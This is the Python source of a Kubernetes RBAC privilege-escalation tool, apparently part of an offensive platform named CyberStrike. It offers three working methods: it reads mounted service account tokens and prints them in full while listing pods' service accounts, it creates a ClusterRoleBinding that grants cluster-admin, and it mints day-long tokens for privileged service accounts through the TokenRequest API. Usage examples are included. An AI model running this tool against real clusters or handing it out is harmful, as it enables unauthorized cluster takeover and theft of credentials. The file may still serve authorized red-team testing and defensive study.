#!/usr/bin/env python3
"""
k8s_privesc.py — Kubernetes RBAC Privilege Escalation

Exploits Kubernetes RBAC misconfigurations for privilege escalation:
- sa_token: Read service account tokens from filesystem or pod specs
- bind_admin: Create ClusterRoleBinding granting cluster-admin
- token_request: Use TokenRequest API to mint tokens for privileged SAs

Tracks created resources in ~/.cyberstrike/kubehook-state.json for cleanup.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    from kubernetes import client, config
    from kubernetes.client.rest import ApiException
except ImportError:
    print("ERROR: kubernetes client required. Install: pip3 install kubernetes", file=sys.stderr)
    sys.exit(1)


STATE_FILE = os.path.expanduser("~/.cyberstrike/kubehook-state.json")


def load_k8s_config(args):
    try:
        if args.kubeconfig:
            config.load_kube_config(config_file=args.kubeconfig)
        else:
            try:
                config.load_incluster_config()
            except config.ConfigException:
                config.load_kube_config()
    except Exception as e:
        print(f"ERROR: Cannot load Kubernetes config: {e}", file=sys.stderr)
        sys.exit(1)


def load_state():
    """Load state file for tracking created resources."""
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, "r") as f:
                return json.load(f)
        except (json.JSONDecodeError, OSError):
            pass
    return {"created_resources": []}


def save_state(state):
    """Save state file."""
    state_dir = os.path.dirname(STATE_FILE)
    os.makedirs(state_dir, exist_ok=True)
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2)


class K8sPrivEsc:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.v1 = None
        self.rbac_v1 = None
        self.auth_v1 = None
        self.state = load_state()

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — Kubernetes RBAC Privilege Escalation")
        print("=" * 70)
        print(f"PID:        {os.getpid()}")
        print(f"Method:     {self.args.method}")
        print(f"Namespace:  {self.args.namespace or 'default'}")
        print(f"Output:     {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:    {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record), flush=True)
        else:
            status = record.get("status", "info")
            method = record.get("method", "unknown")
            print(f"[{record['timestamp']}] [{status.upper()}] method={method}", flush=True)
            if record.get("token"):
                token_preview = record["token"][:40] + "..." if len(record["token"]) > 40 else record["token"]
                print(f"  token: {token_preview}", flush=True)
            if record.get("service_account"):
                print(f"  service_account: {record['service_account']}", flush=True)
            if record.get("namespace"):
                print(f"  namespace: {record['namespace']}", flush=True)
            if record.get("binding_name"):
                print(f"  binding: {record['binding_name']}", flush=True)
            if record.get("details"):
                print(f"  details: {record['details']}", flush=True)
            if record.get("error"):
                print(f"  error: {record['error']}", flush=True)

    def track_resource(self, kind, name, namespace=None):
        """Track a created resource for later cleanup."""
        resource = {
            "kind": kind,
            "name": name,
            "namespace": namespace,
            "created_at": datetime.now().isoformat(),
            "labels": {"app": "cyberstrike"},
        }
        self.state["created_resources"].append(resource)
        save_state(self.state)

    def sa_token(self):
        """Read service account tokens from filesystem or pod specs."""
        token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        namespace_path = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"

        if os.path.exists(token_path):
            try:
                with open(token_path, "r") as f:
                    token = f.read().strip()
                ns = ""
                if os.path.exists(namespace_path):
                    with open(namespace_path, "r") as f:
                        ns = f.read().strip()
                self.emit({
                    "timestamp": datetime.now().isoformat(),
                    "method": "sa_token",
                    "status": "success",
                    "source": "filesystem",
                    "token": token,
                    "namespace": ns,
                    "details": "Token read from mounted service account",
                })
            except (OSError, PermissionError) as e:
                self.emit({
                    "timestamp": datetime.now().isoformat(),
                    "method": "sa_token",
                    "status": "error",
                    "source": "filesystem",
                    "error": str(e),
                })
        else:
            self.emit({
                "timestamp": datetime.now().isoformat(),
                "method": "sa_token",
                "status": "info",
                "source": "filesystem",
                "details": "No mounted SA token found, scanning pod specs via API",
            })

        if not self.running:
            return

        namespace = self.args.namespace or "default"
        try:
            if self.args.namespace:
                pods = self.v1.list_namespaced_pod(namespace=namespace)
            else:
                pods = self.v1.list_pod_for_all_namespaces()

            for pod in pods.items:
                if not self.running:
                    break
                sa_name = pod.spec.service_account_name if pod.spec else None
                if sa_name:
                    self.emit({
                        "timestamp": datetime.now().isoformat(),
                        "method": "sa_token",
                        "status": "found",
                        "source": "pod_spec",
                        "service_account": sa_name,
                        "namespace": pod.metadata.namespace,
                        "pod": pod.metadata.name,
                        "automount": pod.spec.automount_service_account_token if pod.spec else None,
                        "details": f"Pod {pod.metadata.name} uses SA {sa_name}",
                    })
        except ApiException as e:
            self.emit({
                "timestamp": datetime.now().isoformat(),
                "method": "sa_token",
                "status": "error",
                "source": "api",
                "error": f"Failed to list pods: {e.reason}",
            })

    def bind_admin(self):
        """Create ClusterRoleBinding granting cluster-admin to current SA."""
        namespace = self.args.namespace or "default"
        sa_name = self.args.sa_name

        if not sa_name:
            token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
            ns_path = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
            if os.path.exists(ns_path):
                with open(ns_path, "r") as f:
                    namespace = f.read().strip()
            sa_name = "default"
            self.emit({
                "timestamp": datetime.now().isoformat(),
                "method": "bind_admin",
                "status": "info",
                "details": f"No --sa-name specified, using '{sa_name}' in namespace '{namespace}'",
            })

        binding_name = f"cyberstrike-admin-{int(time.time())}"
        body = client.V1ClusterRoleBinding(
            metadata=client.V1ObjectMeta(
                name=binding_name,
                labels={"app": "cyberstrike"},
            ),
            role_ref=client.V1RoleRef(
                api_group="rbac.authorization.k8s.io",
                kind="ClusterRole",
                name="cluster-admin",
            ),
            subjects=[
                client.V1Subject(
                    kind="ServiceAccount",
                    name=sa_name,
                    namespace=namespace,
                ),
            ],
        )

        try:
            self.rbac_v1.create_cluster_role_binding(body=body)
            self.track_resource("ClusterRoleBinding", binding_name)
            self.emit({
                "timestamp": datetime.now().isoformat(),
                "method": "bind_admin",
                "status": "success",
                "binding_name": binding_name,
                "service_account": sa_name,
                "namespace": namespace,
                "details": f"ClusterRoleBinding '{binding_name}' created — {sa_name} is now cluster-admin",
            })
        except ApiException as e:
            self.emit({
                "timestamp": datetime.now().isoformat(),
                "method": "bind_admin",
                "status": "error",
                "binding_name": binding_name,
                "service_account": sa_name,
                "namespace": namespace,
                "error": f"Failed to create ClusterRoleBinding: {e.reason}",
            })

    def token_request(self):
        """Use TokenRequest API to create new tokens for privileged SAs."""
        namespace = self.args.namespace or "default"
        sa_name = self.args.sa_name or "default"

        token_request_body = client.AuthenticationV1TokenRequest(
            spec=client.TokenRequestSpec(
                audiences=["https://kubernetes.default.svc"],
                expiration_seconds=86400,
            ),
        )

        try:
            response = self.v1.create_namespaced_service_account_token(
                name=sa_name,
                namespace=namespace,
                body=token_request_body,
            )
            token = response.status.token if response.status else None
            expiration = response.status.expiration_timestamp.isoformat() if response.status and response.status.expiration_timestamp else None

            self.emit({
                "timestamp": datetime.now().isoformat(),
                "method": "token_request",
                "status": "success",
                "service_account": sa_name,
                "namespace": namespace,
                "token": token,
                "expiration": expiration,
                "details": f"TokenRequest for SA '{sa_name}' in '{namespace}' succeeded",
            })
        except ApiException as e:
            self.emit({
                "timestamp": datetime.now().isoformat(),
                "method": "token_request",
                "status": "error",
                "service_account": sa_name,
                "namespace": namespace,
                "error": f"TokenRequest failed: {e.reason}",
            })

    def run(self):
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        load_k8s_config(self.args)
        self.v1 = client.CoreV1Api()
        self.rbac_v1 = client.RbacAuthorizationV1Api()

        method = self.args.method
        if method == "sa_token":
            self.sa_token()
        elif method == "bind_admin":
            self.bind_admin()
        elif method == "token_request":
            self.token_request()
        else:
            print(f"ERROR: Unknown method: {method}", file=sys.stderr)
            sys.exit(1)

        self.cleanup()

    def cleanup(self):
        print(f"\n--- k8s_privesc summary ---")
        print(f"Method: {self.args.method}")
        print(f"Events emitted: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Kubernetes RBAC privilege escalation toolkit.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 k8s_privesc.py --method sa_token\n"
            "  python3 k8s_privesc.py --method bind_admin --sa-name default --namespace default\n"
            "  python3 k8s_privesc.py --method token_request --sa-name admin-sa --namespace kube-system\n"
            "  python3 k8s_privesc.py --method sa_token --json-output\n"
        ),
    )
    parser.add_argument("--method", type=str, required=True,
                        choices=["sa_token", "bind_admin", "token_request"],
                        help="Privilege escalation method to execute")
    parser.add_argument("--namespace", type=str, default=None, help="Target namespace")
    parser.add_argument("--sa-name", type=str, default=None, help="Service account name")
    parser.add_argument("--kubeconfig", type=str, default=None, help="Path to kubeconfig file")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    privesc = K8sPrivEsc(args)
    privesc.run()


if __name__ == "__main__":
    main()
